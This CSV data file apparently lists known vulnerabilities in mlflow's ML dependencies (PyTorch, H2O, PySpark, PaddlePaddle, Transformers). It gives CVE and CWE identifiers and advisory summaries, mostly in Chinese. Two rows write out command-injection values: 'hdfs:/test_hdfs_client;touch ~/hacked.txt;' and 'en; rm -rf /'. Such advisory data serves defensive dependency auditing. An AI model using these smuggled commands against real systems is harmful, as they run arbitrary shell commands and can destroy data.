mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
mlflow_mlflow,lightning,>=1.8.1,True,CVE-2024-5980,CWE-22,,Pytorch-Lightning 是美国 Lightning AI 开源的一个轻量级 PyTorch 包装器，专为高性能 AI 研究而设计。该组件的 v2.2.4 版本存在任意文件写入漏洞，漏洞源于 /v1/runs API 端点的路径遍历问题。当提取 tar.gz 文件时，攻击者可以利用此漏洞，部署恶意的 tar.gz 插件，从而将文件写入受害者文件系统的任意位置。,2,1
mlflow_mlflow,xgboost,>=0.82,True,,CWE-275,2022-11-01,"## Overview
[xgboost](https://pypi.org/project/xgboost) is a XGBoost Python Package

Affected versions of this package are vulnerable to Insecure Permissions due to workflows running with an extended set of permissions by default.
## Remediation
Upgrade `xgboost` to version 1.7.0 or higher.
## References
- [GitHub Commit](https://github.com/dmlc/xgboost/commit/1082ccd3cc82317da5d546dc0063d1478382180d)
- [GitHub PR](https://github.com/dmlc/xgboost/pull/8267)
- [GitHub Release](https://github.com/dmlc/xgboost/releases/tag/v1.7.0)
",3,2
mlflow_mlflow,lightgbm,,True,CVE-2024-43598,CWE-122,2024-11-12,Microsoft LightGBM 是美国微软公司开发的一个梯度提升框架，广泛应用于机器学习领域。该组件利用基于树的学习算法来进行大规模数据处理和分析。此框架存在一个未披露的安全漏洞，可能允许攻击者在受影响系统上执行任意代码。尽管目前关于这种脆弱性的具体技术细节尚未公布，但可能与输入验证或程序逻辑错误有关。,1,0
mlflow_mlflow,h2o,,True,CVE-2023-6569,CWE-73 CWE-610,,h2o 是新一代的 HTTP 服务器，以极高的速度和更快的响应时间服务于最终用户。该漏洞源于 `ImportFiles` 函数中的输入验证不当，攻击者可以控制文件路径，从而访问或修改位于预定目录外的文件。具体来说，利用该漏洞，攻击者可以通过特制的输入覆盖任意服务器文件，这可能会导致服务中断或利用被攻陷的文件格式（如 CSV、XLS 等）。,1,1
mlflow_mlflow,h2o,,True,CVE-2024-5979,CWE-94,,h2o是新一代的 HTTP 服务器，旨在提供快速响应的服务。h2o-3版本3.46.0存在资源管理错误漏洞，该漏洞通过rapids组件的run_tool命令引发。攻击者能够调用water.tools命名空间下任何类的main函数，通过向MojoConvertTool类传递无效参数导致服务器崩溃。这种情况触发了Denial of Service（拒绝服务）攻击从而使得服务无法正常运行。,2,1
mlflow_mlflow,h2o,,True,CVE-2024-5550,CWE-22,,h2o是新一代的 HTTP 服务器，速度非常快，为最终用户提供了更快的响应。在h2o-3 3.40.0.4版本中，存在信息泄露漏洞，该漏洞源于对类型提示 API 调用的敏感信息暴露。攻击者可以通过请求类型提示查找 '/' 来查看应用程序托管的整个文件系统中的完整路径。当该漏洞与本地文件包含（LFI）漏洞结合时，可能导致服务器的风险。通过 GET 请求获取类型提示，如果路径为 '/'，则可能暴露根文件系统以及包括 /home、/usr、/bin 等目录的信息。,3,1
mlflow_mlflow,h2o,,True,CVE-2024-45758,CWE-502,2024-09-06,"H2O是H2O.ai开源的一个用于分布式、可扩展机器学习的内存平台。
H2O 3.46.0.4及之前版本存在安全漏洞，该漏洞源于攻击者可以任意设置JDBC URL，这可能导致反序列化攻击、文件读取和命令执行。",1,2
mlflow_mlflow,h2o,,True,CVE-2025-6544,CWE-502,2025-09-21,h2oai/h2o-3 是一个开源的分布式机器学习平台，广泛用于数据分析和模型训练。此漏洞存在于版本 <= 3.46.0.8 中，攻击者可利用 JDBC 连接参数处理不当的缺陷实现远程攻击。漏洞的成因是正则表达式检查机制存在缺陷，未能有效过滤恶意输入，导致攻击者通过双层 URL 编码构造恶意数据触发反序列化过程。反序列化过程中，恶意数据可能执行任意代码或读取系统任意文件。此漏洞对大多数使用受影响版本的用户构成严重威胁。,1,2
mlflow_mlflow,pyspark,,True,CVE-2019-10099,CWE-312,2019-08-07,"Apache Spark是美国阿帕奇（Apache）软件基金会的一款支持非循环数据流和内存计算的大规模数据处理引擎。
Apache Spark 2.3.3之前版本中存在加密问题漏洞。该漏洞源于网络系统或产品未正确使用相关密码算法，导致内容未正确加密、弱加密、明文存储敏感信息等。",2,2
mlflow_mlflow,pyspark,,True,,CWE-77,2022-03-25,"## Overview
[pyspark](https://pypi.org/project/pyspark/) is a fast and general cluster computing system for Big Data.

Affected versions of this package are vulnerable to Arbitrary Command Execution via the `Utils.unpack` method when the filename is controlled by a malicious user. This vulnerability exists due to Hadoop's `unTar` function, that doesn't properly escape the filename before passing it to a shell command.
## Remediation
Upgrade `pyspark` to version 3.1.3, 3.3.0 or higher.
## References
- [Apache Jira Issues](https://issues.apache.org/jira/browse/SPARK-38631)
- [GitHub Commit](https://github.com/apache/spark/commit/057c051285ec32c665fb458d0670c1c16ba536b2)
- [GitHub Commit](https://github.com/apache/spark/commit/271b338324e88b0bfc63364937a56305f7b350fc)
- [GitHub Commit](https://github.com/apache/spark/commit/b0b226e79c00d8dc1bee2c9b6818000ab8806f80)
- [GitHub Commit](https://github.com/apache/spark/commit/fb9c633db950d7af70376ff1d076d36297e21c36)
- [GitHub PR](https://github.com/apache/spark/pull/35946)
",2,0
mlflow_mlflow,pyspark,,True,CVE-2018-8024,CWE-200,2018-07-12,在Apache Spark 2.1.0到2.1.2、2.2.0到2.2.1以及2.3.0版本中，恶意用户可以构造一个指向Spark集群UI的作业和阶段信息页面的URL。如果用户被诱导访问该URL，则可以导致脚本执行并暴露用户视图中的信息。一些浏览器（如最近版本的Chrome和Safari）能够阻止此类攻击，但当前版本的Firefox（及可能的其他浏览器）无法阻止。,3,0
mlflow_mlflow,pyspark,,True,CVE-2018-1334,CWE-200,2018-07-12,在Apache Spark 1.0.0 到 2.1.2，2.2.0 到 2.2.1，以及 2.3.0 版本中，当使用PySpark或SparkR时，不同的本地用户可以连接到Spark应用程序并冒充正在运行该应用程序的用户。,3,0
mlflow_mlflow,pyspark,,True,CVE-2018-11760,CWE-520,2019-01-28,"Apache Spark是一款支持非循环数据流和内存计算的大规模数据处理引擎。
Apache Spark中存在本地提权漏洞。攻击者可利用该漏洞获取提升的权限。以下版本受到影响：Apache Spark 1.x版本，2.0.x版本，2.1.x版本，2.2.0版本至2.2.2版本，2.3.0版本至3.1版本。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-38677,CWE-369,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52313,CWE-369,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52302,CWE-476,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52303,CWE-476,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52306,CWE-369,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-38676,CWE-476,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52309,CWE-120 CWE-787,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能导致拒绝服务、信息泄露或可能造成更多损害。",2,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-38674,CWE-369,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52305,CWE-369,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52308,CWE-369,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52312,CWE-476,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-38678,CWE-125,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52304,CWE-120 CWE-787,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致拒绝服务，甚至更大的损坏。",2,0
mlflow_mlflow,paddlepaddle,,True,CVE-2022-45908,CWE-94,2022-11-25,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.4存在安全漏洞，该漏洞源于其paddle.audio.functional.get_window组件在用户提供的winstr上调用eval允许攻击者实现命令注入导致任意代码执行。",1,2
mlflow_mlflow,paddlepaddle,,True,CVE-2024-1603,CWE-73,,PaddlePaddle（飞桨）是一个开源的深度学习平台，用户可以使用它进行各种机器学习任务。该平台在版本 2.6.0 中存在安全漏洞，源于对外部输入的处理不当，允许通过 `paddle.vision.ops.read_file` 函数读取系统中的任意文件。攻击者可以通过注入恶意输入，导致数据泄露或对数据完整性造成部分影响。该漏洞易于利用，同时缺乏适当的目录范围限制。,2,1
mlflow_mlflow,paddlepaddle,,True,CVE-2024-0521,CWE-94,,PaddlePaddle（飞桨）是一个开源的深度学习平台，旨在支持灵活的并行分布式深度学习。该漏洞源于 `_wget_download` 函数中，`url` 参数被不当处理并纳入命令字符串，缺乏适当的验证或净化。攻击者可以通过注入恶意输入进入代码生成流程，执行任意代码。利用此漏洞，攻击者能够在主机系统上执行任意命令，攻击者利用代码运行的进程权限进行操作。,1,1
mlflow_mlflow,paddlepaddle,,True,CVE-2023-38675,CWE-369,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致运行时崩溃和拒绝服务。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52314,CWE-78,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能导致远程代码执行漏洞。",1,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52311,CWE-78,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能导致远程代码执行漏洞。",1,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52307,CWE-120 CWE-787,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能会导致拒绝服务，甚至更大的损坏。",2,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-52310,CWE-78,2024-01-03,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.6.0 版本之前存在安全漏洞，该漏洞源于可能导致远程代码执行漏洞。",1,0
mlflow_mlflow,paddlepaddle,,True,CVE-2022-46741,CWE-125,2022-12-07,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.4之前版本存在安全漏洞，该漏洞源于gather_tree读取越界。",2,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-38669,CWE-416,2023-07-26,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.5.0 之前版本存在安全漏洞，该漏洞源于存在释放后重用（Use after free）漏洞。攻击者利用此漏洞来执行未授权的操作或执行恶意代码。",2,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-38670,CWE-476,2023-07-26,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.5.0 之前版本存在安全漏洞，该漏洞源于在 PaddlePaddle 的 paddle.flip 函数中存在空指针解引用（Null pointer dereference）漏洞。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-38672,CWE-369,2023-07-26,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.5.0 之前版本存在安全漏洞，该漏洞源于在 PaddlePaddle 的 paddle.trace 函数中存在浮点异常（FPE）漏洞，从而导致系统崩溃。",3,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-38673,CWE-78,2023-07-26,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.5.0 之前版本存在安全漏洞，该漏洞源于在 PaddlePaddle 的 fs.py 文件中存在命令注入漏洞。",1,0
mlflow_mlflow,paddlepaddle,,True,CVE-2023-38671,CWE-120 CWE-787,2023-07-26,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.5.0之前版本存在安全漏洞，该漏洞源于在 PaddlePaddle 的 paddle.trace 函数中存在基于堆的缓冲区溢出（Heap buffer overflow）漏洞。",2,0
mlflow_mlflow,paddlepaddle,,True,CVE-2024-0818,CWE-22,,PaddlePaddle（飞桨）是一个开源的深度学习平台，支持并行分布式深度学习。PaddlePaddle 2.6.0之前版本存在路径遍历漏洞，该漏洞源于对路径名限制的不当，攻击者可以通过注入 '...' 字符串覆盖服务器上的任意文件。具体来说，攻击者可以通过 'module_name' 参数注入 '../'，借此遍历目录，覆盖服务器中的文件，甚至在开启SSH的服务器上，可能会导致远程代码执行的风险。,1,1
mlflow_mlflow,paddlepaddle,,True,CVE-2024-0817,CWE-77,,PaddlePaddle（飞桨）是一个开源的深度学习平台，旨在促进大规模的深度学习应用。此漏洞存在于 `IrGraph.draw` 方法，由于未正确验证用户输入，使得攻击者可以注入恶意命令。攻击者只需在该方法的输入参数中注入恶意命令即可执行任意命令，在不需要特权的情况下控制系统的行为。利用此漏洞，其影响范围包括系统被完全控制。,1,1
mlflow_mlflow,paddlepaddle,,True,CVE-2024-0815,CWE-78,,PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。此漏洞存在于PaddlePaddle 2.6.0版本，由于在 `paddle.utils.download._wget_download` 函数中对输入的验证不当，攻击者可以通过恶意构造输入绕过过滤，从而执行任意命令。此漏洞的根本原因在于对URL编码不足的处理，可能导致未经授权的访问、数据丢失或其他潜在的危害后果。,1,1
mlflow_mlflow,paddlepaddle,,True,CVE-2024-0917,CWE-94,,"PaddlePaddle（飞桨）是一个独立的深度学习平台，提供并行分布式深度学习的功能。该平台的2.6.0版本存在代码注入漏洞，原因是未能正确验证用户提供的输入。攻击者可以通过发送经过特别构造的请求执行任意代码。漏洞的证明概念（PoC）示例代码展示了如何通过向 HDFSClient 发送恶意参数（如 ""hdfs:/test_hdfs_client;touch ~/hacked.txt;""）来触发此漏洞，从而在用户主目录中创建名为 hacked.txt 的文件。",1,1
mlflow_mlflow,paddlepaddle,,True,CVE-2022-46742,CWE-94,2022-12-07,"PaddlePaddle（飞桨）是中国飞桨（PaddlePaddle）开源的一个独立的研发深度学习平台。
PaddlePaddle 2.4之前版本存在安全漏洞，该漏洞源于。，paddle.audio.functional.get_window中存在代码注入，允许任意代码执行。",1,2
mlflow_mlflow,paddlepaddle,,True,,,2024-09-30,<p>百度paddle飞桨AI框架在最新（beta版本：3.0.0b2，发布版本：2.6.2）及之前版本的take_along_axis接口存在堆内存溢出，可直接使得paddle框架进程崩溃产生拒绝服务攻击。此外，攻击者可通过精心内存布局，可导致框架进程内存地址泄露，甚至存在本地内存代码执行风险。</p>,2,1
mlflow_mlflow,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
mlflow_mlflow,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
mlflow_mlflow,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
mlflow_mlflow,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
mlflow_mlflow,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
mlflow_mlflow,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
mlflow_mlflow,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
mlflow_mlflow,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
mlflow_mlflow,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
mlflow_mlflow,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
mlflow_mlflow,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
mlflow_mlflow,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
mlflow_mlflow,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
mlflow_mlflow,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
mlflow_mlflow,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
mlflow_mlflow,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
mlflow_mlflow,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
mlflow_mlflow,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
mlflow_mlflow,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
mlflow_mlflow,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
mlflow_mlflow,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
mlflow_mlflow,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
mlflow_mlflow,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
mlflow_mlflow,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
mlflow_mlflow,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
